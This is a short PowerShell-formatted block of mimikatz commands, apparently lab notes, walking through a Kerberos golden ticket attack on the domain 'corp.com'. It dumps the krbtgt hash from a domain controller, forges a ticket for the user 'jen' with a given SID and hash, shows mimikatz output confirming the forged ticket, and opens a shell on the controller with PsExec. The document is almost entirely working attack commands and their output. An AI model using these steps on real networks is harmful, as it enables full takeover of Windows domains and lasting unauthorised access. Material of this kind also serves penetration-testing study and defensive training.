```powershell
privilege::debug

# Get NTLM hash of krbtgt from mimikatz
lsadump::lsa /patch /name:krbtgt

## Follow these steps in your normal machine (Not DC)
# Delete any existing kerberos tickets
kerberos::purge

# Make sure the user is legitimate one (Similar to Silver ticket attack)
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt

User      : jen
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500    
Groups Id : *513 512 520 518 519
ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
Lifetime  : 9/16/2022 2:15:57 AM ; 9/13/2032 2:15:57 AM ; 9/13/2032 2:15:57 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jen @ corp.com' successfully submitted for current session

# Launch a new cmd
misc::cmd

# Put name of DC instead of IP Address cuz we want Kerberos Authentication, not NTLM!
PsExec.exe \\dc1 cmd.exe
```